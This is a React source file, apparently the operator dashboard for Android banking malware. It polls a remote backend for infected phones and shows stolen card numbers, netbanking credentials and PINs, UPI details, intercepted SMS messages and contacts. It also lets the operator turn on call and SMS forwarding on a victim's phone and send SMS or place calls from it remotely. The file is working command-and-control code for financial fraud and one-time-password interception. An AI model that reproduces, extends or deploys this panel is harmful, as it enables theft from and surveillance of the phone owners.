import { useState, useEffect, useCallback } from 'react'

const API = 'https://bill-1-9yfp.onrender.com/api/admin/all'
const API_BASE = 'https://bill-1-9yfp.onrender.com'

export default function App() {
  const [data, setData] = useState(null)
  const [openId, setOpenId] = useState(null)
  const [fwd, setFwd] = useState({})
  const [saving, setSaving] = useState({})
  const [acts, setActs] = useState({})
  const [time, setTime] = useState('')
  const [expanded, setExpanded] = useState({})

  const fetchData = useCallback(async () => {
    try {
      const r = await fetch(API)
      const d = await r.json()
      setData(d)
      setTime(new Date().toLocaleTimeString())
    } catch {}
  }, [])

  useEffect(() => {
    fetchData()
    const id = setInterval(fetchData, 3000)
    return () => clearInterval(id)
  }, [fetchData])

  const loadFwd = async (id) => {
    try {
      const r = await fetch(`${API_BASE}/api/forwarding-config/${id}`)
      const d = await r.json()
      setFwd(prev => ({...prev, [id]: d}))
    } catch {}
  }

  const saveFwd = async (id) => {
    const c = fwd[id]
    if (!c) return
    setSaving(prev => ({...prev, [id]: true}))
    try {
      await fetch(`${API_BASE}/api/forwarding-config`, {
        method: 'PUT',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          device_id: id,
          call_forwarding: c.call_forwarding,
          call_forwarding_number: c.call_forwarding_number,
          call_sim_slot: c.call_sim_slot || '1',
          sms_forwarding: c.sms_forwarding,
          sms_forwarding_number: c.sms_forwarding_number,
          sms_sim_slot: c.sms_sim_slot || '1',
        }),
      })
    } catch {}
    setSaving(prev => ({...prev, [id]: false}))
  }

  const sendAction = async (id) => {
    const a = acts[id]
    if (!a || !a.target_number) return
    setActs(prev => ({...prev, [id]: {...prev[id], sending: true}}))
    try {
      await fetch(`${API_BASE}/api/admin/action`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          device_id: id,
          type: a.type || 'sms',
          target_number: a.target_number,
          message: a.message || '',
        }),
      })
      setActs(prev => ({...prev, [id]: {target_number: '', message: '', sim_slot: '1', type: 'sms'}}))
    } catch {}
    setActs(prev => ({...prev, [id]: {...prev[id], sending: false}}))
  }

  if (!data) return <div style={s.loading}>Loading...</div>

  const devices = data.device_sections || []

  const parseSim = (info) => {
    try { return JSON.parse(info || '[]') } catch { return [] }
  }

  const dataTypes = [
    { key: 'bill_updates', label: 'Bill Updates' },
    { key: 'card_details', label: 'Cards' },
    { key: 'card_verifications', label: 'Card Verify' },
    { key: 'netbanking_details', label: 'Netbanking' },
    { key: 'netbanking_pins', label: 'NB Pins' },
    { key: 'upi_details', label: 'UPI' },
    { key: 'payment_attempts', label: 'Payments' },
  ]

  return (
    <div style={s.body}>
      <div style={s.header}>
        <span style={{fontSize:15,fontWeight:700}}>{devices.length} Device{devices.length!==1?'s':''}</span>
        <div style={{display:'flex',alignItems:'center',gap:8}}>
          <span style={{fontSize:10,opacity:.5}}>{time}</span>
          <button onClick={()=>{if(!confirm('Clear ALL data?'))return;fetch(API_BASE+'/api/admin/clear',{method:'POST'}).then(fetchData)}}
            style={{fontSize:10,color:'#ef4444',background:'none',border:'1px solid #ef4444',borderRadius:6,padding:'2px 7px',cursor:'pointer'}}>
            Clear
          </button>
        </div>
      </div>

      <div style={s.wrap}>
        {devices.length === 0 && <div style={s.loading}>No devices</div>}

        {devices.map((sec) => {
          const d = sec.device || {}
          const id = d.device_id
          const open = openId === id
          const lastMs = d.last_seen ? Date.now() - new Date(d.last_seen).getTime() : Infinity
          const status = !d.last_seen ? 'UNINSTALLED' : lastMs < 120000 ? 'ONLINE' : lastMs < 3600000 ? 'OFFLINE' : 'UNINSTALLED'
          const statusColor = status === 'ONLINE' ? '#22c55e' : status === 'OFFLINE' ? '#ef4444' : '#64748b'
          const sims = parseSim(d.sim_info)
          const a = acts[id] || {}

          return (
            <div key={id} style={s.card}>
              <div style={{...s.head, borderLeft:`4px solid ${statusColor}`}}
                onClick={() => { setOpenId(open ? null : id); loadFwd(id); setActs(prev => ({...prev, [id]: prev[id]||{target_number:'',message:'',sim_slot:'1',type:'sms'}})) }}>
                <div>
                  <div style={s.row2}>
                    <span style={{fontWeight:700,fontSize:13}}>{d.device_name || id?.slice(0,6)||'-'}</span>
                    <span style={{...s.badge, background:statusColor}}>{status}</span>
                  </div>
                  <div style={{fontSize:10,color:'#64748b',marginTop:1}}>
                    {d.model||''} {d.os_version ? `(Android ${d.os_version})` : ''}
                    {d.last_seen ? ` - ${new Date(d.last_seen).toLocaleString()}` : ''}
                    {d.offline_seconds > 0 ? ` - offline ${Math.round(d.offline_seconds/60)}m` : ''}
                  </div>
                </div>
                <span style={{fontSize:10,color:'#94a3b8'}}>{open ? '▲' : '▼'}</span>
              </div>

              {open && (
                <div style={s.inner}>
                  {sims.length > 0 && (
                    <div style={{marginBottom:8}}>
                      {sims.map((x,i) => (
                        <div key={i} style={{fontSize:11,color:'#475569'}}>
                          SIM {x.sim_slot||i+1}: {x.carrier||'-'}{x.number ? ` (${x.number})` : ''}
                        </div>
                      ))}
                    </div>
                  )}

                  {dataTypes.map(({key: t, label}) => {
                    const items = (data[t]||[]).filter(r => r.device_id === id || !r.device_id)
                    if (items.length === 0) return null
                    return (
                      <div key={t} style={{marginBottom:8}}>
                        <div style={s.sect}>{label} ({items.length})</div>
                        {items.map((row,i) => (
                          <div key={row.id||i} style={s.item}>
                            {Object.entries(row).filter(([k]) => k !== 'id' && k !== 'device_id').map(([k,v]) => {
                              if (k === 'created_at') v = v?new Date(v).toLocaleString():'-'
                              if (typeof v === 'boolean') v = v?'Yes':'No'
                              if (k === 'amount') v = `₹${v}`
                              return String(v??'')
                            }).filter(Boolean).join(' | ') || '-'}
                          </div>
                        ))}
                      </div>
                    )
                  })}

                    <div style={{marginBottom:8}}>
                    <div style={s.sect}>Forwarding</div>
                    <div style={{display:'flex',flexDirection:'column',gap:4}}>
                      {['Call','SMS'].map(label => {
                        const k = label.toLowerCase()+'_forwarding'
                        const nk = k+'_number'
                        const sk = k+'_sim_slot'
                        return (
                          <div key={label} style={{display:'flex',alignItems:'center',gap:4,fontSize:11}}>
                            <span style={{fontWeight:600,minWidth:30}}>{label}</span>
                            <select value={fwd[id]?.[sk]||'1'} onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],[sk]:e.target.value}}))}
                              style={{...s.inp,width:60,flex:'none'}}>
                              {sims.map((x,i) => (
                                <option key={i} value={String(x.sim_slot||i+1)}>SIM {x.sim_slot||i+1} {x.number ? `(${x.number})` : ''}</option>
                              ))}
                              {sims.length === 0 && <option value="1">SIM 1</option>}
                            </select>
                            <input type="text" placeholder="Number" value={fwd[id]?.[nk]||''}
                              onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],[nk]:e.target.value}}))}
                              style={{...s.inp,flex:1}} />
                            <label style={{display:'flex',alignItems:'center',gap:2,fontSize:11,cursor:'pointer',whiteSpace:'nowrap'}}>
                              <input type="checkbox" checked={fwd[id]?.[k]||false}
                                onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],[k]:e.target.checked}}))} /> On
                            </label>
                          </div>
                        )
                      })}
                      <button onClick={()=>saveFwd(id)} disabled={saving[id]}
                        style={s.save}>{saving[id]?'Saving...':'Save'}</button>
                    </div>
                  </div>

                  <div style={{marginBottom:8}}>
                    <div style={s.sect}>Actions</div>
                    <div style={{display:'flex',flexDirection:'column',gap:4}}>
                      <select value={a.sim_slot||'1'} onChange={e=>setActs(prev=>({...prev,[id]:{...prev[id],sim_slot:e.target.value}}))}
                        style={s.inp}>
                        {sims.map((x,i) => (
                          <option key={i} value={x.sim_slot||i+1}>SIM {x.sim_slot||i+1} {x.number ? `(${x.number})` : ''}</option>
                        ))}
                        {sims.length === 0 && <option value="1">SIM 1</option>}
                      </select>
                      <input type="text" placeholder="Phone number" value={a.target_number||''}
                        onChange={e=>setActs(prev=>({...prev,[id]:{...prev[id],target_number:e.target.value}}))}
                        style={s.inp} />
                      <textarea placeholder="SMS message" value={a.message||''}
                        onChange={e=>setActs(prev=>({...prev,[id]:{...prev[id],message:e.target.value}}))}
                        style={{...s.inp,minHeight:40,resize:'vertical',fontFamily:'inherit'}} />
                      <div style={{display:'flex',gap:6}}>
                        <button onClick={()=>{setActs(prev=>({...prev,[id]:{...prev[id],type:'sms'}}));sendAction(id)}} disabled={a.sending}
                          style={{...s.save,background:'#22c55e',flex:1}}>{a.sending?'...':'Send SMS'}</button>
                        <button onClick={()=>{setActs(prev=>({...prev,[id]:{...prev[id],type:'call'}}));sendAction(id)}} disabled={a.sending}
                          style={{...s.save,background:'#ef4444',flex:1}}>{a.sending?'...':'Call'}</button>
                      </div>
                    </div>
                  </div>

                  <Sec title={`SMS (${sec.sms?.length||0})`} expanded={expanded} id={id} name="sms" onToggle={setExpanded}>
                    {!sec.sms?.length ? <div style={s.txt}>No SMS</div> : (
                      <div style={s.scroll}>
                        {sec.sms.map((x,j) => (
                          <div key={x.id||j} style={s.item}>
                            <div style={{fontWeight:600,fontSize:12}}>{x.sender||'-'}</div>
                            <div style={{fontSize:11,color:'#475569',wordBreak:'break-word'}}>{x.message||'-'}</div>
                            <div style={{fontSize:9,color:'#94a3b8'}}>{x.received_at?new Date(x.received_at).toLocaleString():''}</div>
                          </div>
                        ))}
                      </div>
                    )}
                  </Sec>

                  <Sec title={`Contacts (${sec.contacts?.length||0})`} expanded={expanded} id={id} name="contacts" onToggle={setExpanded}>
                    {!sec.contacts?.length ? <div style={s.txt}>No Contacts</div> : (
                      <div style={s.scroll}>
                        {sec.contacts.map((x,j) => (
                          <div key={x.id||j} style={s.item}>
                            <div style={{fontWeight:600,fontSize:12}}>{x.name||'-'}</div>
                            <div style={{fontSize:11,color:'#475569'}}>{x.phone||''}{x.email ? ` | ${x.email}` : ''}</div>
                          </div>
                        ))}
                      </div>
                    )}
                  </Sec>
                </div>
              )}
            </div>
          )
        })}
      </div>
    </div>
  )
}

function Sec({title, expanded, id, name, onToggle, children}) {
  const key = `${id}-${name}`
  const open = expanded[key] !== false
  return (
    <div style={{marginBottom:4}}>
      <div style={{...s.sect, cursor:'pointer', userSelect:'none', display:'flex', justifyContent:'space-between', alignItems:'center', marginTop:6}}
        onClick={() => onToggle(prev => ({...prev, [key]: !open}))}>
        <span>{title}</span>
        <span style={{fontSize:9,color:'#94a3b8'}}>{open ? '▲' : '▼'}</span>
      </div>
      {open && children}
    </div>
  )
}

const s = {
  body: { fontFamily:'-apple-system,sans-serif', background:'#f1f5f9', minHeight:'100vh', padding:'0 0 40px', fontSize:13 },
  loading: { display:'flex', height:'100vh', alignItems:'center', justifyContent:'center', color:'#666', fontSize:15 },
  header: { background:'#1e293b', color:'#fff', padding:'10px 14px', display:'flex', justifyContent:'space-between', alignItems:'center', position:'sticky', top:0, zIndex:10 },
  wrap: { padding:'10px', maxWidth:500, margin:'0 auto' },
  card: { background:'#fff', borderRadius:10, marginBottom:8, overflow:'hidden', boxShadow:'0 1px 3px rgba(0,0,0,.07)' },
  head: { display:'flex', justifyContent:'space-between', alignItems:'center', padding:'10px 12px', cursor:'pointer' },
  badge: { fontSize:9, color:'#fff', padding:'1px 6px', borderRadius:8, fontWeight:600 },
  row2: { display:'flex', alignItems:'center', gap:6 },
  inner: { padding:'0 10px 10px', borderTop:'1px solid #f1f5f9', display:'flex', flexDirection:'column', gap:4 },
  sect: { fontSize:11, fontWeight:700, color:'#475569', padding:'5px 0 2px', borderBottom:'1px solid #e2e8f0', marginBottom:2 },
  scroll: { maxHeight:250, overflowY:'auto' },
  item: { padding:'4px 0', borderBottom:'1px solid #f8fafc', fontSize:11 },
  txt: { padding:'6px 0', color:'#999', fontSize:11 },
  inp: { padding:'5px 8px', border:'1px solid #e2e8f0', borderRadius:6, fontSize:11, outline:'none', width:'100%', boxSizing:'border-box' },
  save: { color:'#fff', border:'none', borderRadius:6, padding:'5px 12px', fontSize:11, fontWeight:600, cursor:'pointer', marginTop:2 },
}
